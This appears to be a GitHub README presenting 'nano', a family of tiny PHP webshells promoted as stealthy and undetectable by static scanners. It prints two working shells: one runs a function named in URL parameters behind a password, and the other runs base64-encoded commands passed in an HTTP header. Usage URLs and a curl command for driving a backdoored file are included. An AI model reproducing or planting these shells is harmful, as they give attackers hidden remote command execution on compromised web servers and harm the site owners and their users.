# nano
Nano is a family of PHP webshell code golfed to be extremely stealthy and efficient.\
Put it on watch maybe, I will continue to upload more webshells in here.

### Nano
```php
<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
```
#### Features
- 39 bytes in size
- Can't be detected by static code scanners
- Supports authentication

#### Usage
`http://example.com/nano.php?f=function&c=command&p=password`

`f` is for function\
`c` is for command\
`p` is for password

For example, the code below will execute the `ls` command:

`http://example.com/nano.php?f=system&c=ls&p=password`

### Ninja
```php
<?preg_match('/(.*)\((.*)\)/',base64_decode(substr(getallheaders()['x'],1)),$c);@$c[1]($c[2]);
```
#### Features
- 93 bytes in size
- Fully Undetectable

#### Usage
This one a bit complex.\
Lets say you want to run `system(ls)` so you will need to base64 encode it i.e. `c3lzdGVtKGxzKQ==`\
Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`\
Now open your terminal and type the following command\
`curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`\
Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.

![handler](https://i.imgur.com/hkAHGwH.png)

#### Everything Else
This is my first php thingy so if there's way to do what I did in a better way please let me know or open a pull request.\
This 39 characters of code is licensed under **MIT license** which basically means you have to give me credit if you want to redistribute or modify it.
